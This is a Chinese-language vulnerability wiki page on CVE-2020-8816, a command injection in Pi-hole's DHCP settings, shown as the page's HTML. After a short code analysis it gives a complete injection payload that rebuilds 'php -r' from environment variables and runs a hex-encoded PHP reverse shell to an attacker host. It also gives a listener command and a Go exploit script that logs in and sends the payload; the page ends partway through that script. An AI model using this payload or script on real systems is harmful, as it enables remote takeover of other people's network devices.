<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Pi-hole/%EF%BC%88CVE%202020-8816%EF%BC%89Pi-hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE 2020-8816）Pi-hole 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE 2020-8816\uff09Pi-hole \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_5" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-13051%EF%BC%89Pi-Hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-13051%EF%BC%89Pi-Hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-13051）Pi-Hole 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
        Phpweb 前台getshell
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-8816pi-hole">（CVE 2020-8816）Pi-hole 远程代码执行漏洞<a class="headerlink" href="#cve-2020-8816pi-hole" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Pi-hole \&lt;= 4.3.2</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<blockquote>
<p>./scripts/pi-hole/php/savesettings.php</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="c1">// Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="p">([</span><span class="nx">a</span><span class="o">-</span><span class="nx">fA</span><span class="o">-</span><span class="nx">F0</span><span class="o">-</span><span class="mi">9</span><span class="p">]{</span><span class="mi">2</span><span class="p">}[:]?){</span><span class="mi">6</span><span class="p">}</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">mac_addr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">    </span>
<span class="p">}</span>

<span class="err">$</span><span class="nx">mac</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">_POST</span><span class="p">[</span><span class="s">&quot;AddMAC&quot;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(!</span><span class="nx">validMAC</span><span class="p">(</span><span class="err">$</span><span class="nx">mac</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="o">...</span><span class="p">}</span>

<span class="err">$</span><span class="nx">mac</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strtoupper</span><span class="p">(</span><span class="err">$</span><span class="nx">mac</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="err">$</span><span class="nx">_POST</span><span class="p">[</span><span class="s">&quot;addstatic&quot;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">...</span>
<span class="w">    </span><span class="nx">exec</span><span class="p">(</span><span class="s">&quot;sudo pihole -a addstaticdhcp &quot;</span><span class="p">.</span><span class="err">$</span><span class="nx">mac</span><span class="p">.</span><span class="s">&quot; &quot;</span><span class="p">.</span><span class="err">$</span><span class="nx">ip</span><span class="p">.</span><span class="s">&quot; &quot;</span><span class="p">.</span><span class="err">$</span><span class="nx">hostname</span><span class="p">);</span>
<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="err">$</span><span class="nx">_POST</span><span class="p">[</span><span class="s">&quot;removestatic&quot;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">...</span>
<span class="w">    </span><span class="nx">exec</span><span class="p">(</span><span class="s">&quot;sudo pihole -a removestaticdhcp &quot;</span><span class="p">.</span><span class="err">$</span><span class="nx">mac</span><span class="p">);</span>
<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p>注意到，在validMAC函数中，只使用preg_match对MAC地址的格式进行了检查，而preg_match函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在MAC地址，就可以通过检查。</p>
<p>通过检查的用户输入做了一次大写转换，然后直接放入了exec函数中。</p>
<p><strong>最终的payload</strong></p>
<div class="codehilite"><pre><span></span><code>aaaaaaaaaaaa<span class="ni">&amp;&amp;SHORT=</span><span class="cp">${</span><span class="n">PATH</span><span class="c1">##/***:/</span><span class="cp">}</span><span class="ni">&amp;&amp;A=</span><span class="cp">${</span><span class="n">SHORT</span><span class="c1">#???</span><span class="cp">}</span><span class="ni">&amp;&amp;P=</span><span class="cp">${</span><span class="n">A</span><span class="o">%/</span><span class="err">???</span><span class="cp">}</span><span class="ni">&amp;&amp;B=</span><span class="cp">${</span><span class="n">PWD</span><span class="c1">#/???/???/</span><span class="cp">}</span><span class="ni">&amp;&amp;H=</span><span class="cp">${</span><span class="n">B</span><span class="o">%</span><span class="err">???</span><span class="o">/</span><span class="err">?????</span><span class="cp">}</span><span class="ni">&amp;&amp;C=</span><span class="cp">${</span><span class="n">PWD</span><span class="c1">#/??</span><span class="cp">}</span><span class="ni">&amp;&amp;R=</span><span class="cp">${</span><span class="n">C</span><span class="o">%/</span><span class="err">???</span><span class="o">/</span><span class="err">????</span><span class="o">/</span><span class="err">?????</span><span class="cp">}</span><span class="ni">&amp;&amp;</span><span class="nv">$P$H$P$IFS</span><span class="ni">-</span><span class="nv">$R$IFS</span><span class="ni">&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));</span>&#39;<span class="err">&amp;&amp;</span>
</code></pre></div>

<h4 id="payload">payload分析<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h4>
<ul>
<li>1、模拟MAC地址</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    aaaaaaaaaaaa</p>
<p>根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。</p>
<ul>
<li>2、获取p,h,r的小写字符</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    SHORT=<span SHORT_="SHORT#???" class="arithmatex"><span class="MathJax_Preview">{PATH##/***:/}&amp;&amp;A=</span><script type="math/tex">{PATH##/***:/}&&A=</script></span>&amp;&amp;P=<span PWD_="PWD#/???/???/" class="arithmatex"><span class="MathJax_Preview">{A%/???}&amp;&amp;B=</span><script type="math/tex">{A%/???}&&B=</script></span>&amp;&amp;H=<span PWD_="PWD#/??" class="arithmatex"><span class="MathJax_Preview">{B%???/?????}&amp;&amp;C=</span><script type="math/tex">{B%???/?????}&&C=</script></span>}&amp;&amp;R=${C%/???/????/?????</p>
<p>原本的payload应该为：</p>
<div class="codehilite"><pre><span></span><code><span class="nv">aaaaaaaaaaaa</span><span class="o">&amp;&amp;</span><span class="nv">php</span><span class="w"> </span><span class="o">-</span><span class="nv">r</span><span class="w"> </span>‘$<span class="nv">sock</span><span class="o">=</span><span class="nv">fsockopen</span><span class="ss">(</span>“<span class="nv">target</span>.<span class="mi">0</span><span class="o">-</span><span class="nv">sec</span>.<span class="nv">org</span>”,<span class="mi">2256</span><span class="ss">)</span><span class="c1">;exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</span>
</code></pre></div>

<p>但是由于程序会对用户输入做一个大写转换，因此，php -r会变成PHP
-R，命令无法识别，因此需要找到一种方式获取p、h、r的小写字符。</p>
<p>可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。</p>
<p>在浏览器中进入http://<a href="http://www.0-sec.org/admin">www.0-sec.org/admin</a>，登陆后，选择Setting-&gt;DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa$PATH，结果显示：</p>
<p><img alt="1.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下：</p>
<p><img alt="2.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。</p>
<p>我使用了<a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">Shell参数扩展</a>对这两个变量值进行截取：</p>
<div class="codehilite"><pre><span></span><code><span class="n">p</span><span class="o">:</span>
<span class="w">    </span><span class="n">SHORT</span><span class="o">=</span><span class="n">$</span><span class="o">{</span><span class="n">PATH</span><span class="err">##</span><span class="sr">/***:/}&amp;&amp;A=${SHORT#???}&amp;&amp;P=${A%/</span><span class="o">???}</span>
<span class="n">h</span><span class="o">:</span>
<span class="w">    </span><span class="n">B</span><span class="o">=</span><span class="n">$</span><span class="o">{</span><span class="n">PWD</span><span class="err">#</span><span class="sr">/???/???/}&amp;&amp;H=${B%???/</span><span class="o">?????}</span>
<span class="n">r</span><span class="o">:</span>
<span class="w">    </span><span class="n">C</span><span class="o">=</span><span class="n">$</span><span class="o">{</span><span class="n">PWD</span><span class="err">#</span><span class="sr">/??}&amp;&amp;R=${C%/???/????/</span><span class="o">?????}</span>
</code></pre></div>

<p>根据<a href="https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching">模式匹配</a>的规则，应该可以写出更简洁的方法，但是我的系统中好多shell选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。</p>
<p>3、获得反向shell</p>
<div class="codehilite"><pre><span></span><code>$<span class="nv">P</span>$<span class="nv">H</span>$<span class="nv">P</span>$<span class="nv">IFS</span><span class="o">-</span>$<span class="nv">R</span>$<span class="nv">IFS</span><span class="s1">&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;</span>
</code></pre></div>

<p>先把变量换成对应的字符，注意上面的<code>$IFS</code>是shell的一个内定变量，默认为<code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code>，这里代替空格。</p>
<div class="codehilite"><pre><span></span><code><span class="nv">php</span><span class="w"> </span><span class="o">-</span><span class="nv">r</span><span class="w"> </span><span class="s1">&#39;exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))&#39;</span>
</code></pre></div>

<p>然后替换<code>hex2bin</code>的执行结果（转义符是我后加的）：</p>
<div class="codehilite"><pre><span></span><code><span class="nv">php</span><span class="w"> </span><span class="o">-</span><span class="nv">r</span><span class="w"> </span><span class="s1">&#39;exec(php -r \&#39;</span>$<span class="nv">sock</span><span class="o">=</span><span class="nv">fsockopen</span><span class="ss">(</span><span class="s2">&quot;target.0-sec.org&quot;</span>,<span class="mi">2256</span><span class="ss">)</span><span class="c1">;exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#39;)&#39;</span>
</code></pre></div>

<p>这段代码就可以获得一个反向shell。</p>
<h2 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<p>在主机的命令行中输入：</p>
<div class="codehilite"><pre><span></span><code>ncat -nlvp 2256
</code></pre></div>

<p>进入监听模式，等待其他机器的连接。</p>
<p>返回虚拟机，在浏览器中打开<code>http://192.168.1.107/admin</code>，登录，选择Setting-&gt;DHCP选项卡，输入payload：</p>
<div class="codehilite"><pre><span></span><code>aaaaaaaaaaaa<span class="ni">&amp;&amp;SHORT=</span><span class="cp">${</span><span class="n">PATH</span><span class="c1">##/***:/</span><span class="cp">}</span><span class="ni">&amp;&amp;A=</span><span class="cp">${</span><span class="n">SHORT</span><span class="c1">#???</span><span class="cp">}</span><span class="ni">&amp;&amp;P=</span><span class="cp">${</span><span class="n">A</span><span class="o">%/</span><span class="err">???</span><span class="cp">}</span><span class="ni">&amp;&amp;B=</span><span class="cp">${</span><span class="n">PWD</span><span class="c1">#/???/???/</span><span class="cp">}</span><span class="ni">&amp;&amp;H=</span><span class="cp">${</span><span class="n">B</span><span class="o">%</span><span class="err">???</span><span class="o">/</span><span class="err">?????</span><span class="cp">}</span><span class="ni">&amp;&amp;C=</span><span class="cp">${</span><span class="n">PWD</span><span class="c1">#/??</span><span class="cp">}</span><span class="ni">&amp;&amp;R=</span><span class="cp">${</span><span class="n">C</span><span class="o">%/</span><span class="err">???</span><span class="o">/</span><span class="err">????</span><span class="o">/</span><span class="err">?????</span><span class="cp">}</span><span class="ni">&amp;&amp;</span><span class="nv">$P$H$P$IFS</span><span class="ni">-</span><span class="nv">$R$IFS</span><span class="ni">&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));</span>&#39;<span class="err">&amp;&amp;</span>
</code></pre></div>

<p>返回主机，可以看到主机收到了连接，可以执行命令了：<img alt="3.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>CVE-2020-8816.go</p>
</blockquote>
<p><code>go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</code></p>
<p><code>./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</code></p>
<p><img alt="4.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p><img alt="5.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p><img alt="6.png" src="../resource/%28CVE2020-8816%29Pi-hole%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span> <span class="n">main</span>


<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
    <span class="s2">&quot;flag&quot;</span>
    <span class="s2">&quot;log&quot;</span>
    <span class="s2">&quot;strings&quot;</span>
    <span class="s2">&quot;github.com/anaskhan96/soup&quot;</span>
    <span class="s2">&quot;encoding/hex&quot;</span>
    <span class="s2">&quot;github.com/levigross/grequests&quot;</span>
<span class="p">)</span>

<span class="nb">type</span> <span class="n">Options</span> <span class="n">struct</span> <span class="p">{</span>
    <span class="n">url</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="n">string</span>

<span class="p">}</span>


<span class="n">var</span> <span class="n">HOST</span> <span class="n">string</span>
<span class="n">var</span> <span class="n">URL</span> <span class="n">string</span>
<span class="n">var</span> <span class="n">PORT</span> <span class="n">string</span>
<span class="n">var</span> <span class="n">PASSWD</span> <span class="n">string</span>

<span class="n">func</span> <span class="n">generate_shell</span><span class="p">()</span> <span class="n">string</span><span class="p">{</span>
    <span class="n">payload</span> <span class="o">:=</span> <span class="s2">&quot;php -r &#39;$sock=fsockopen(</span><span class="se">\&quot;</span><span class="s2">HOST</span><span class="se">\&quot;</span><span class="s2">, PORT);exec(</span><span class="se">\&quot;</span><span class="s2">/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</span><span class="se">\&quot;</span><span class="s2">);&#39;&quot;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;HOST&quot;</span><span class="p">,</span> <span class="n">HOST</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;PORT&quot;</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">([]</span><span class="n">byte</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="p">}</span>

<span class="n">func</span> <span class="n">extractFlags</span><span class="p">()</span> <span class="o">*</span><span class="n">Options</span> <span class="p">{</span>
    <span class="n">urlPtr</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;http://10.0.0.1/admin/&quot;</span><span class="p">,</span> <span class="s2">&quot;Set the Url of the admin panel&quot;</span><span class="p">)</span>
    <span class="n">passPtr</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s2">&quot;pass&quot;</span><span class="p">,</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="s2">&quot;Admin Password&quot;</span><span class="p">)</span>
    <span class="n">hostPtr</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s2">&quot;host&quot;</span><span class="p">,</span> <span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;Set the host for the reverse shell&quot;</span><span class="p">)</span>
    <span class="n">portPtr</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;1337&quot;</span><span class="p">,</span> <span class="s2">&quot;Set Port for the reverse shell&quot;</span><span class="p">)</span>
    <span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>

    <span class="k">return</span> <span class="o">&amp;</span><span class="n">Options</span><span class="p">{</span><span class="o">*</span><span class="n">urlPtr</span><span class="p">,</span> <span class="o">*</span><span class="n">passPtr</span><span class="p">,</span> <span class="o">*</span><span class="n">hostPtr</span><span class="p">,</span><span class="o">*</span><span class="n">portPtr</span><span class="p">}</span>
<span class="p">}</span>

<span class="n">func</span> <span class="n">doLogin</span><span class="p">(</span><span class="n">ses</span> <span class="o">*</span><span class="n">grequests</span><span class="o">.</span><span class="n">Session</span><span class="p">)</span> <span class="o">*</span><span class="n">grequests</span><span class="o">.</span><span class="n">Session</span><span class="p">{</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Logging In...&quot;</span><span class="p">)</span>
    <span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ses</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="s2">&quot;index.php&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">grequests</span><span class="o">.</span><span class="n">RequestOptions</span><span class="p">{</span><span class="n">Data</span><span class="p">:</span> <span class="nb">map</span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="n">string</span><span class="p">{</span><span class="s2">&quot;pw&quot;</span><span class="p">:</span> <span class="n">PASSWD</span><span class="p">}})</span>
    <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="n">nil</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">&quot;Error logging-in: &quot;</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">Ok</span> <span class="o">!=</span> <span class="n">true</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Request for log-in did not return OK&quot;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Logged In!&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ses</span>
<span class="p">}</span>

<span class="n">func</span> <span class="n">getToken</span><span class="p">(</span><span class="n">ses</span> <span class="o">*</span><span class="n">grequests</span><span class="o">.</span><span class="n">Session</span><span class="p">)</span> <span class="n">string</span><span class="p">{</span>
    <span class="n">resp</span><span class="p">,</span> <span class="n">err</span><span class="o">:=</span> <span class="n">ses</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="s2">&quot;index.php&quot;</span><span class="p">,</span><span class="n">nil</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="n">nil</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">&quot;Error getting token: &quot;</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">Ok</span> <span class="o">!=</span> <span class="n">true</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Request for getting token did not return OK&quot;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">html</span> <span class="o">:=</span> <span class="n">soup</span><span class="o">.</span><span class="n">HTMLParse</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
    <span class="n">token</span> <span class="o">:=</span> <span class="n">html</span><span class="o">.</span><span class="n">Find</span><span class="p">(</span><span class="s2">&quot;div&quot;</span><span class="p">,</span><span class="s2">&quot;id&quot;</span><span class="p">,</span><span class="s2">&quot;token&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">Text</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">token</span>
<span class="p">}</span>

<span class="n">func</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">ses</span> <span class="o">*</span><span class="n">grequests</span><span class="o">.</span><span class="n">Session</span><span class="p">,</span> <span class="n">token</span> <span class="n">string</span><span class="p">,</span> <span class="n">payload</span> <span class="n">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">full_payload</span> <span class="o">:=</span> <span class="s2">&quot;aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W</span><span class="si">%%</span><span class="s2">?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X</span><span class="si">%%</span><span class="s2">???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z</span><span class="si">%%</span><span class="s2">/*}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">));&#39;&amp;&amp;&quot;</span>
    <span class="n">resp</span><span class="p">,</span><span class="n">err</span> <span class="o">:=</span> <span class="n">ses</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s2">&quot;settings.php&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">grequests</span><span class="o">.</span><span class="n">RequestOptions</span><span class="p">{</span><span class="n">Data</span><span class="p">:</span> <span class="nb">map</span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="n">string</span><span class="p">{</span>
        <span class="s2">&quot;AddMAC&quot;</span><span class="p">:</span><span class="n">full_payload</span><span class="p">,</span>
        <span class="s2">&quot;field&quot;</span><span class="p">:</span><span class="s2">&quot;DHCP&quot;</span><span class="p">,</span>
        <span class="s2">&quot;AddIP&quot;</span><span class="p">:</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">,</span> 
        <span class="s2">&quot;AddHostname&quot;</span><span class="p">:</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">,</span> 
        <span class="s2">&quot;addstatic&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span> 
        <span class="s2">&quot;token&quot;</span><span class="p">:</span><span class="n">token</span><span class="p">}})</span>
            <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="n">nil</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">&quot;Error sending payload: &quot;</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">Ok</span> <span class="o">!=</span> <span class="n">true</span> <span class="p">{</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Request for sending payload did not return OK&quot;</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="n">func</span> <span class="n">main</span><span class="p">(){</span>
    <span class="n">options</span> <span class="o">:=</span> <span class="n">extractFlags</span><span class="p">()</span>
    <span class="n">HOST</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">host</span>
    <span class="n">URL</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">url</span>
    <span class="n">PORT</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">port</span>
    <span class="n">PASSWD</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">password</span> 
    <span class="n">session</span> <span class="o">:=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">NewSession</span><span class="p">(</span><span class="n">nil</span><span class="p">)</span>
    <span class="n">doLogin</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
